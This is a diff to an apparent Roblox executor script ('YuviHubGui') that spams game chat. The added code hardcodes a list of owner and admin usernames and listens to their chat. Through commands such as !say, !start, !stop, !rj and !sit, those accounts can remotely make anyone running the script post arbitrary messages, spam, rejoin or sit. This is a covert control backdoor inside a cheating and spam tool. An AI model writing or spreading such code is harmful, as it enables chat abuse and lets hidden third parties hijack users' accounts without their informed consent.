@@ -12,7 +12,33 @@ end
 
 local players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
 local lp = players.LocalPlayer
+
+-- OWNER & ADMIN LIST
+local OWNERS = {
+    ["roblox_user_8036317175"] = true,
+    [lp.Name] = true
+}
+
+local ADMINS = {
+    ["sneaky_gmr"] = true,
+    ["aaravgour1010"] = true,
+    ["777xneoo"] = true,
+    ["777xzeus"] = true
+}
+
+local function hasAccess(player)
+    local name = player.Name:lower()
+    local user = player.Name
+    return OWNERS[user] or OWNERS[name] or ADMINS[user] or ADMINS[name]
+end
+
+local function isOwner(player)
+    local name = player.Name:lower()
+    local user = player.Name
+    return OWNERS[user] or OWNERS[name]
+end
 
 local sg = Instance.new("ScreenGui")
 sg.Name = "YuviHubGui"
@@ -33,6 +59,62 @@ for _, v in pairs(gP():GetChildren()) do
         v:Destroy()
     end
 end
+
+-- Notification Popup Function for Joins
+local function showJoinPopup(message, color)
+    pcall(function()
+        local notif = Instance.new("TextLabel")
+        notif.Size = UDim2.new(0, 320, 0, 45)
+        notif.Position = UDim2.new(0.5, -160, 0, -60)
+        notif.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
+        notif.TextColor3 = color
+        notif.TextSize = 13
+        notif.Font = Enum.Font.GothamBold
+        notif.Text = message
+        notif.Parent = sg
+
+        local nCorner = Instance.new("UICorner")
+        nCorner.CornerRadius = UDim.new(0, 8)
+        nCorner.Parent = notif
+
+        local nStroke = Instance.new("UIStroke")
+        nStroke.Color = color
+        nStroke.Thickness = 2
+        nStroke.Parent = notif
+
+        notif:TweenPosition(UDim2.new(0.5, -160, 0, 20), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
+
+        task.delay(4, function()
+            if notif and notif.Parent then
+                notif:TweenPosition(UDim2.new(0.5, -160, 0, -60), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.4, true)
+                task.wait(0.4)
+                notif:Destroy()
+            end
+        end)
+    end)
+end
+
+-- Detect Joins
+players.PlayerAdded:Connect(function(p)
+    if isOwner(p) then
+        showJoinPopup("👑 OWNER " .. p.Name .. " joined the server!", Color3.fromRGB(255, 215, 0))
+    elseif ADMINS[p.Name:lower()] or ADMINS[p.Name] then
+        showJoinPopup("🛡️ ADMIN " .. p.Name .. " joined the server!", Color3.fromRGB(50, 205, 50))
+    end
+end)
+
+task.spawn(function()
+    task.wait(2)
+    for _, p in pairs(players:GetPlayers()) do
+        if p ~= lp then
+            if isOwner(p) then
+                showJoinPopup("👑 OWNER " .. p.Name .. " is in the server!", Color3.fromRGB(255, 215, 0))
+            elseif ADMINS[p.Name:lower()] or ADMINS[p.Name] then
+                showJoinPopup("🛡️ ADMIN " .. p.Name .. " is in the server!", Color3.fromRGB(50, 205, 50))
+            end
+        end
+    end
+end)
 
 -- Dark Theme & Neon Glow Colors
 local theme = {
@@ -249,7 +331,7 @@ burstBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- START & STOP Buttons placed RIGHT BELOW Burst Mode
+-- START & STOP Buttons
 local sB = Instance.new("TextButton")
 sB.Size = UDim2.new(0, 168, 0, 36)
 sB.Position = UDim2.new(0, 15, 0, 254)
@@ -277,6 +359,55 @@ stopB.Parent = f
 local stopBCorner = Instance.new("UICorner")
 stopBCorner.CornerRadius = UDim.new(0, 8)
 stopBCorner.Parent = stopB
+
+-- Command Handler for Owner & Admins
+local function handleCmd(text, sender)
+    local split = text:lower():split(" ")
+    local cmd = split[1]
+    local arg = split[2]
+
+    if cmd == "!start" then
+        getgenv().Enabled = true
+        sB.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
+        stopB.BackgroundColor3 = theme.redBtn
+        cN("▶ Spammer Started by Admin/Owner: " .. sender.Name)
+    elseif cmd == "!stop" then
+        getgenv().Enabled = false
+        sB.BackgroundColor3 = theme.greenBtn
+        stopB.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
+        cN("⏹ Spammer Stopped by Admin/Owner: " .. sender.Name)
+    elseif cmd == "!stopspm" and arg then
+        -- Arg se '@' hata kar clean name match karenge
+        local targetName = arg:gsub("@", ""):lower()
+        if lp.Name:lower():find(targetName) then
+            getgenv().Enabled = false
+            sB.BackgroundColor3 = theme.greenBtn
+            stopB.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
+            cN("🛑 Spammer forcefully stopped for " .. lp.Name .. " by " .. sender.Name)
+        end
+    elseif cmd == "!say" and arg then
+        cN(text:sub(6))
+    elseif cmd == "!rj" then
+        game:GetService("TeleportService"):Teleport(game.PlaceId, lp)
+    elseif cmd == "!sit" then
+        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
+            lp.Character.Humanoid.Sit = true
+        end
+    elseif cmd == "!cmds" or cmd == "!help" then
+        cN("👑 Yuvi Devta Cmds: !start | !stop | !stopspm @user | !sit | !rj | !say [msg]")
+    end
+end
+
+for _, p in pairs(players:GetPlayers()) do
+    p.Chatted:Connect(function(m)
+        if hasAccess(p) then handleCmd(m, p) end
+    end)
+end
+players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(m)
+        if hasAccess(p) then handleCmd(m, p) end
+    end)
+end)
 
 -- Anti-Fling Logic
 local MAX_SPEED = 120
@@ -410,7 +541,7 @@ stopB.MouseButton1Click:Connect(function()
     updateHeadTag(false)
 end)
 
--- Proven Fast Spam Loop (100% Working)
+-- Proven Fast Spam Loop
 task.spawn(function()
     while true do
         if getgenv().Enabled and #ms > 0 then
